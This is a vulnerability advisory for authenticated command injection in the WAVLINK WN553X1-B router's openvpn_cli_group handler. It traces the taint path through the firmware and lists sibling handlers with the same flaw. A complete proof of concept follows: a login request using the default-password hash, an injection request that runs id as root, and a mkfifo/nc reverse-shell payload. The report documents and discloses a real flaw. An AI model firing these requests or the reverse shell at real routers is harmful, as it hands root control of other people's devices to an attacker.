# WAVLINK WN553X1-B Router

- Vendor: WAVLINK
- Product: WAVLINK WN553X1-B (Model WN553X3B)
- Firmware Version: V260403_2.0.0 (OpenWrt 21.02, aarch64 / MT7981)
- Vulnerability Type: Authenticated Command Injection

## Overview

An authenticated command injection vulnerability was identified in the WAVLINK WN553X1-B router. An attacker with a valid session can send a crafted HTTP POST request to achieve arbitrary command execution with root privileges on the target device. The issue can be triggered via the following endpoint:

`POST /protocol.csp?fname=system&opt=openvpn_cli_group&function=set HTTP/1.1`

Successful exploitation requires the attacker to be authenticated and supply a valid session token (obtainable via the `opt=login` endpoint with the device password; factory default is `admin`).

## Vulnerability Details

The vulnerability resides in the `sub_416D88` function of the `/bin/ioos` component (the `.csp` backend service listening on 127.0.0.1:81, behind lighttpd). In the `action=add` branch, the user-controlled `group_id` / `group_name` parameters are passed to `snprintf` without proper input validation or sanitization, and the resulting string is then forwarded to `system`, which leads to OS command injection.

The taint flow (instruction level):

![01](./images/Snipaste_2026-08-08_12-17-26.png)
  

```
0x416e58:  get request parameter "group_id"   -> x24   (taint source, no filtering)
0x416e68:  get request parameter "group_name" -> x25   (taint source, no filtering)

0x417128:  system("uci add ovpnclient groups")
0x417138:  snprintf(buf, 0x100, "uci set ovpnclient.@groups[-1].group_id='%s'", x24)
0x41714c:  system(buf)                         <- group_id injection point
0x417158:  snprintf(buf, 0x100, "uci set ovpnclient.@groups[-1].group_name='%s'", x25)
0x417170:  system(buf)                         <- group_name injection point
0x41717c:  system("uci commit ovpnclient")
```
![02](./images/Snipaste_2026-08-08_12-17-52.png)

Since the user input is embedded inside single quotes (`'%s'`), supplying a value such as `x';CMD;'` breaks out of the quoted string and injects an arbitrary command. The actual command executed on the device (captured during testing) is:

```
sh -c "uci set ovpnclient.@groups[-1].group_name='x';id>/tmp/pwn;''"
```

The same unsanitized pattern exists in multiple sibling handlers in the same binary: `wireguard_cli_group` (`sub_41A748`), `check_pwd` (`sub_416B50`), `ovpn_file` (`sub_4162A8`), `openvpn_cli` (`sub_416568`), `wg_file` (`sub_41A488`), `wireguard_cli` (`sub_419DA8`) and `wireguard_manual_cli` (`sub_418CC0`).

## Proof of Concept

  ![03](./images/Snipaste_2026-08-08_12-18-04.png)

Step 1 — login to obtain a session token (`usrid` = SHA256 of the password, default `admin`):

```http
POST /protocol.csp?fname=system&opt=login&function=set&usrid=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1
Host: <target>
Content-Length: 0
Connection: close

```

Response:

```json
{ "opt": "login", "fname": "system", "function": "set", "token": "16F34AA7D9855E7D33B05CD9AA72E831", "init_status": 0, "error": 0 }
```

Step 2 — send the command injection request with the token (the session token is bound to the client IP and expires after 300 seconds):

```http
POST /protocol.csp?fname=system&opt=openvpn_cli_group&function=set&action=add&group_id=a&group_name=x%27%3B/usr/bin/id%3E/tmp/pwn%3B%27&token=16F34AA7D9855E7D33B05CD9AA72E831 HTTP/1.1
Host: <target>
Content-Length: 0
Connection: close

```

Response:

```json
{ "opt": "openvpn_cli_group", "fname": "system", "function": "set", "success": 1, "error": 0 }
```

The URL-decoded `group_name` payload is `x';/usr/bin/id>/tmp/pwn;'`, and `/tmp/pwn` on the device then contains `uid=0(root) gid=0(root) groups=0(root)`.

A reverse shell can be obtained with the following payload (busybox nc has no `-e`, so a mkfifo pipe is used; note that `nc` resides at `/usr/bin/nc` in this firmware):

```
x';rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc <LHOST> <LPORT> >/tmp/f;'
```

## Impact

An authenticated attacker can inject arbitrary shell commands through the `group_name` (or `group_id`) parameter and execute them with **root** privileges (the ioos service runs as root), resulting in full compromise of the device.

## Reproduction Result

The vulnerability was dynamically verified against the firmware emulated with qemu-aarch64 + chroot (lighttpd front-end on 80/443 proxying to ioos on 127.0.0.1:81):

  ![04](./images/Snipaste_2026-08-08_12-18-11.png)

An interactive root reverse shell from the emulated firmware to the Windows host (192.168.1.5:4444) was also confirmed:

  ![05](./images/Snipaste_2026-08-08_12-18-22.png)
  

